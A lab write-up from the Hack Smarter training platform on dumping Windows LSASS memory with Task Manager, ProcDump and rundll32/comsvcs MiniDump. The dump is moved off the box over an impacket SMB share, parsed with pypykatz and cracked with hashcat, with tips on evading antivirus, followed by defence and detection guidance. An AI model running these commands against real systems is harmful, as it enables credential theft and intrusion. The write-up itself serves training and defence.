---
layout: writeup
title: "Attacking LSASS"
date: 2026-07-22
category: hacksmarter
tags: [credential-access, lsass, procdump, pypykatz, hashcat]
excerpt: "Three ways to pull credentials out of the LSASS process on Windows, then move the dump offline and crack it. A beginner-friendly walk through a Hack Smarter lab, plus how modern Windows defends against all of it."
permalink: /writeups/attacking-lsass/
---

This Hack Smarter lab is a gentle introduction to one of the most common moves in the post-exploitation playbook: pulling credentials straight out of a Windows machine's memory. We start with full RDP credentials, so the access is already handed to us, and the goal is to see how many different ways that memory can be dumped and what falls out when we parse it.

```
Username: Administrator
Password: ebz0yxy3txh9BDE*yeh
```

I like `remmina` for RDP when I'm working from my Linux side. Open it, enter the target IP, drop in the credentials, and you're on the box.

---

## What LSASS Is and Why We Attack It

LSASS stands for Local Security Authority Subsystem Service, and it's the Windows process (`lsass.exe`) that handles authentication. It checks logins, enforces security policy, and manages user sessions. To do that job, it keeps credential material in its own memory after a user signs in: NTLM hashes, Kerberos tickets, and in some configurations cleartext passwords.

That memory is the prize. If you can read the memory of `lsass.exe`, you can walk away with the credentials of everyone who has logged into that machine, which often includes domain accounts and service accounts that open doors elsewhere on the network. This is why it's usually the first thing an attacker reaches for after landing admin on a Windows host. In the MITRE ATT&CK framework it's catalogued as [T1003.001, OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/), and it remains one of the most common credential access techniques on Windows.

One thing worth calling out up front: reading LSASS memory requires local administrator or SYSTEM privileges. In this lab we're handed the Administrator account, so we already have what we need. On a real engagement, getting to this point is its own effort.

The plan is the same across all three methods below. We create a memory dump file on the target, move that file to our attack machine, and then parse it offline. Parsing offline is the quiet part: the tool that reads the credentials never runs on the victim, so it doesn't trip the antivirus that would light up the moment a tool like Mimikatz touches the box.

---

## Attacking LSASS With Task Manager

The easiest method uses a tool that's already sitting on every Windows desktop. If you have GUI or RDP access, Task Manager can create the dump for you with a few clicks.

1. Run Task Manager as Administrator
2. Open the **Details** tab
3. Scroll to `lsass.exe`
4. Right-click it and choose **Create memory dump file**

![Task Manager with lsass.exe selected and the Create memory dump file option](/assets/images/attacking-lsass/1.png)

*Right-clicking `lsass.exe` in the Details tab gives you the dump option directly*

Windows writes the dump and tells you where it landed.

![Confirmation dialog showing the path to the created lsass dump file](/assets/images/attacking-lsass/2.png)

*The dump gets written to `C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP`*

Opening that folder confirms the `lsass.DMP` file is there and ready to move to our attack machine, which we'll cover in a bit.

![File Explorer showing the lsass.DMP file in the Temp directory](/assets/images/attacking-lsass/3.png)

*Our first dump, sitting in the Temp folder*

---

## Attacking LSASS With ProcDump

If you'd rather stay on the command line, `ProcDump` from the Sysinternals suite does the same job. It's digitally signed by Microsoft, so basic antivirus tends to leave it alone, which makes it a popular choice.

ProcDump isn't installed by default, so grab it from Microsoft first: [ProcDump download](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump).

Extract the `.zip`, open a terminal as Administrator, and navigate into the unzipped ProcDump folder inside `Downloads`.

![Terminal navigated into the extracted ProcDump folder](/assets/images/attacking-lsass/4.png)

*Inside the ProcDump folder, ready to run*

Now point ProcDump at `lsass.exe`:

```
.\procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
```

A quick tour of that command. `-accepteula` accepts the license agreement automatically so the tool doesn't stop to prompt you. `-ma` writes a full memory dump, which is what we need since the credentials live throughout the process memory. `lsass.exe` is the target process, and `C:\lsass.dmp` is where the dump gets written.

![ProcDump writing a full memory dump of lsass.exe](/assets/images/attacking-lsass/5.png)

*ProcDump captures the full dump and reports success*

Confirm the file landed by listing the root of `C:\`:

```
dir C:\
```

![dir C:\ showing lsass.dmp in the root directory](/assets/images/attacking-lsass/6.png)

*`lsass.dmp` is in place*

---

## Attacking LSASS With Native Binaries

Sometimes downloading a tool like ProcDump onto the target draws too much attention. A quieter option is to use binaries that already ship with Windows, known as LOLBins (Living Off the Land Binaries). Since these files are already trusted parts of the operating system, using them blends in with normal activity.

The one we'll use is `rundll32.exe` to call the `MiniDump` function inside `comsvcs.dll`, a built-in Windows DLL. That function can dump process memory in the same way Task Manager does. This exact technique is documented in the [LOLBAS project's comsvcs entry](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/).

First we need the Process ID (PID) of `lsass.exe`:

```
tasklist | findstr lsass
```

![tasklist filtered to show the lsass.exe process ID](/assets/images/attacking-lsass/7.png)

*`lsass.exe` is running as PID 720 in this lab*

Now feed that PID to `rundll32`. The command produces no output on success, so we confirm afterward with `dir C:\`. Give this dump a different name since we already have a `lsass.dmp` in the root.

```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 720 C:\lsass2.dmp full
```

Here `720` is the LSASS PID we just found, `C:\lsass2.dmp` is the output file, and `full` requests a full memory dump.

![rundll32 comsvcs MiniDump run followed by dir C:\ showing lsass2.dmp](/assets/images/attacking-lsass/8.png)

*No output from the command itself, but `dir C:\` confirms `lsass2.dmp` was created*

---

## Moving the Dump to Your Attack Machine

With the three methods above, we've got dump files ready to pull off the target. There are a few ways to move a file across, and the one we'll use here is a quick SMB server with `impacket-smbserver`.

On your attack machine, start the server and share your working directory:

```
impacket-smbserver -smb2support -username Administrator -password 'ebz0yxy3txh9BDE*yeh' share /home/[user lab directory]
```

![impacket-smbserver started and listening for connections](/assets/images/attacking-lsass/9.png)

*The SMB server is up and waiting for the target to connect*

Back on the target, open File Explorer and type your attack machine's IP and share name into the address bar. You can find that IP in the terminal you used to connect to the Hack Smarter VPN.

```
\\[machine IP]\share
```

![File Explorer on the target connecting to the attacker SMB share](/assets/images/attacking-lsass/10.png)

*The share opens to the directory we specified when starting the server*

Open a second Explorer tab, navigate to `C:\` where the dumps live, and cut the file over into the share folder.

![The lsass dump file copied into the SMB share](/assets/images/attacking-lsass/11.png)

*The dump lands on our attack machine, ready for parsing*

---

## Parsing the Dump With pypykatz

Now we read the credentials out of the memory dump. The classic tool for this is Mimikatz, but it's loud and reliably sets off antivirus, which is exactly why we moved the file off the target: so we can parse it offline where none of that matters.

On Linux, [`pypykatz`](https://github.com/skelsec/pypykatz) does the job. It's a Python reimplementation of Mimikatz's parsing logic, so it reads the same secrets out of the dump without needing Windows.

```
pypykatz lsa minidump lsass2.dmp
```

![pypykatz parsing the minidump and listing logon sessions](/assets/images/attacking-lsass/12.png)

*pypykatz walks the logon sessions stored in the dump*

![pypykatz output showing the NT hash for the user tyler](/assets/images/attacking-lsass/13.png)

*It surfaces credentials for the user `tyler`, including an NT hash*

---

## Cracking the Hash With Hashcat

An NT hash isn't the password, but if the password is weak we can recover it offline with a wordlist. Save the hash to a file and run Hashcat against `rockyou.txt` using mode `1000`, which is the mode for NTLM hashes.

```
echo "58a478135a93ac3bf058a5ea0e8fdb71" > hash.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat cracking the NT hash to reveal Password123](/assets/images/attacking-lsass/14.png)

*The hash falls quickly*

```
NT Hash: 58a478135a93ac3bf058a5ea0e8fdb71
Cracked Password: Password123
```

And there it is. A single dump handed us a working credential for another user on the machine.

---

## What This Looks Like on Modern Windows

This lab runs clean because the target isn't using the protections that ship with current Windows. It's worth knowing what you'll actually run into, because the defaults have shifted.

On Windows 11 version 24H2, LSA protection (also called RunAsPPL) is [enabled by default](https://learn.microsoft.com/en-us/windows/security/book/identity-protection-advanced-credential-protection): immediately on fresh installs, and after a five-day evaluation period on upgrades. It runs LSASS as a protected process, which blocks the handle access that all three methods above rely on. Credential Guard raises the bar further. Since Windows 11 22H2 and Windows Server 2025 it's on by default on hardware that qualifies, and it moves the secrets into a virtualized process (`LSAIso.exe`) that even a SYSTEM-level attacker can't read.

None of this makes the technique obsolete, and attackers keep finding ways around these protections, but the easy path shown here mostly reflects older or misconfigured systems. That's a useful thing to understand from both sides of the keyboard.

---

## Defending LSASS

1. **Enable LSA Protection (RunAsPPL).** Running LSASS as a protected process blocks the standard handle access used to read its memory. On Windows 11 24H2 this is on by default, and you can check or manage it under Device Security > Core Isolation > Local Security Authority protection.
2. **Enable Credential Guard.** Virtualization-based security isolates the credential secrets so that even code running as SYSTEM can't reach them. This is the strongest of the built-in options where the hardware supports it.
3. **Turn on the ASR rule for LSASS.** Microsoft Defender's Attack Surface Reduction rule "Block credential stealing from the Windows local security authority subsystem" stops many dumping attempts at the source.
4. **Disable AutoLogon.** AutoLogon stores a cleartext password on the system that ends up recoverable from memory, so leaving it off removes an easy win.
5. **Apply least privilege.** Every method here needed administrator or SYSTEM access. Limiting who holds local admin, and keeping high-value accounts from logging into low-trust machines, shrinks both the opportunity and the payoff.

## Detection

- **Sysmon Event ID 10 (ProcessAccess)** targeting `lsass.exe` with suspicious granted-access masks is the workhorse signal. Access requests carrying rights like `0x1010` or `0x1410` are a common tell for a dump in progress.
- **Sysmon Event ID 11 (FileCreate)** for `.dmp` files, especially anything written to `C:\` or a temp path, catches the artifact these methods leave behind.
- **Process creation logs** for `rundll32.exe` invoking `comsvcs.dll` with `MiniDump` in the command line flag the LOLBin path directly. If you run Elastic, their write-up on [detecting credential dumping with ES|QL](https://www.elastic.co/blog/elastic-security-detecting-credential-dumping) is a solid starting point.
- **Behavioral EDR detections.** Microsoft Defender for Endpoint and similar tools ship dedicated LSASS credential-theft analytics that key on the access pattern rather than a specific tool.

## Resources

- [MITRE ATT&CK T1003.001: OS Credential Dumping - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [LOLBAS: comsvcs.dll](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)
- [pypykatz on GitHub](https://github.com/skelsec/pypykatz)
- [Atomic Red Team tests for T1003.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md)
- [Microsoft: advanced credential protection (LSA protection and Credential Guard)](https://learn.microsoft.com/en-us/windows/security/book/identity-protection-advanced-credential-protection)
